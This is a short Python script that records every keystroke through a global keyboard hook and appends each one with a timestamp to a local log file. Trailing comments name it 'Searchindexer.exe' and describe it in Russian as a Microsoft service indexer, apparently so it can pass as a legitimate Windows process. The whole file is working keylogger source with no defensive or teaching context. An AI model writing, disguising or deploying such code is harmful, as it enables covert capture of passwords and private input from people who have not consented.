import logging
import keyboard
logging.basicConfig(filename='latest.log', filemode='a', format='[%(asctime)s]: %(message)s', level=logging.INFO)
logging.info('__log start__')


def save_key(event):
    logging.info(str(event))


keyboard.hook(save_key)
keyboard.wait()

# Searchindexer.exe
# индексатор службы Microsoft
